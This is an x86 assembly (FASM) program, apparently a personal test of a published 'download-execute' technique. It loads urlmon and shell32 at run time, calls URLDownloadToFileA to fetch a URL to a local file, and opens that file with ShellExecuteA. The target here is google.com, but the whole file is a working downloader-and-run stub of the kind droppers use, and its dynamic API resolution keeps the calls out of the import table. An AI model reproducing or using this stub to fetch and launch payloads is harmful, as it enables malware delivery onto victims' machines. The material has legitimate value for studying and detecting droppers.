;; https://wiremask.eu/articles/download-execute-assembly-x86/
;; URLDownloadToFile with dynamic module loading
;; xiaolaba, testing, 2022-OCT-15

format PE GUI 4.0
entry main

;include 'include/win32a.inc'
include 'win32a.inc'

section '.code' code readable executable
main:  
    ; Load urlmon.dll
    invoke LoadLibrary, _urlmon
    test eax, eax
    jz exit

    ; Retrieve the address of the URLDownloadToFileA function
    invoke GetProcAddress, eax, _URLDownloadToFile
    test eax, eax
    jz exit

    ; Call URLDownloadToFileA
    push eax
    push 0
    push 0
    push szFileName
    push szURL
    push 0
    call eax

    ; Free urlmon.dll
    pop eax
    invoke FreeLibrary, eax

    ; Load shell32.dll
    invoke LoadLibrary, _shell32
    test eax, eax
    jz exit

    ; Retrieve the address of the ShellExecuteA function
    invoke GetProcAddress, eax, _ShellExecute
    test eax, eax
    jz exit

    ; Call ShellExecute
    push eax
    push SW_SHOW
    push 0
    push 0
    push szFileName
    push 0
    push 0
    call eax

    ; Free shell32.dll
    pop eax
    invoke FreeLibrary, eax

exit:
    invoke ExitProcess, 0

section '.idata' import data readable
library kernel32, 'kernel32.dll'

import kernel32,\
    ExitProcess, 'ExitProcess',\
    LoadLibrary,'LoadLibraryA',\
    GetProcAddress, 'GetProcAddress',\
    FreeLibrary, 'FreeLibrary'

section '.rdata' data readable
_urlmon             db 'urlmon.dll', 0
_shell32            db 'shell32.dll', 0
_URLDownloadToFile  db 'URLDownloadToFileA', 0
_ShellExecute       db 'ShellExecuteA', 0;

;;szFileName db 'index.htm', 0
;;szURL      db 'http://wiremask.eu/', 0

;; change to test google web
szFileName db 'index.html', 0
szURL      db 'https://www.google.com/', 0